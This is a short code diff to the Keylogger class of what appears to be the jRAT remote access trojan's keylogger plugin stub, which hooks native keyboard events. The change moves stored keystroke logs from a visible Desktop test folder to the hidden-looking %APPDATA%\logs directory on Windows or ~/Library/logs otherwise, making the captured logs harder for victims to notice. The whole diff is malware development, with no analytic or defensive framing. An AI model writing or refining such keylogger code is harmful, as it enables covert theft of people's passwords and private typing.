@@ -6,6 +6,7 @@ import java.util.Date;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import pro.jrat.api.stub.utils.OperatingSystem;
 import pro.jrat.plugin.keylogger.stub.activities.Activities;
 import pro.jrat.plugin.keylogger.stub.activities.Key;
 import pro.jrat.plugin.keylogger.stub.codec.Base64;
@@ -37,8 +38,16 @@ public class Keylogger implements NativeKeyListener {
 	}
 
 	public static File getLogsRoot() {
-		File file = new File(System.getProperty("user.home") + "\\Desktop\\LOGSTEST\\");
+		File file;
+		
+		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			file = new File(System.getenv("APPDATA") + "\\logs\\");
+		} else {
+			file = new File(System.getProperty("user.home") + "/Library/logs/");
+		}
+		
 		file.mkdirs();
+		
 		return file;
 	}
 
